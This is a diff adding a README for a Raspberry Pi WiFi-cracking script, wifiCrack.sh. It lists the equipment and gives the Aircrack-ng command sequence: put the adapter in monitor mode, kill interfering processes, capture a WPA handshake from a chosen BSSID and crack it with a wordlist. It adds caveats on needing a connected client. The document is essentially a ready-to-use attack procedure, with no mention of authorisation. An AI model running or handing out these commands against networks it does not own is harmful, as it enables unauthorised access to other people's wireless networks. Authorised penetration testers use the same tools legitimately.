@@ -1,0 +1,23 @@
+Equipment used:
+Raspberry Pi 3 Model B+
+CanaKit Raspberry Pi WiFi Wireless Adapter/Dongle
+Raspberry Pi OS
+Aircrack-ng 1.5.2
+dictionary wordlist in txt format
+
+Cavats:
+-not using a wordlist will exponentially increase time to crack password
+-requires "active" target (at least one device MUST be connected to target router to capture a handshake for this method to work)
+-shell initially requires -x (execution) permission via chmod +x *.sh
+
+Reference Commands:
+airmon-ng
+airmon-ng start wlan0
+airmon-ng check kill
+airodump-ng wlan1mon
+airodump-ng -c CHANNEL --bssid MAC -w ./ wlan1mon
+aircrack-ng -a2 -b MAC -w ./WORDLIST.txt ./*.cap
+
+Instructions:
+Extract and run wifiCrack.sh from the terminal.
+Follow instructions in the terminal.
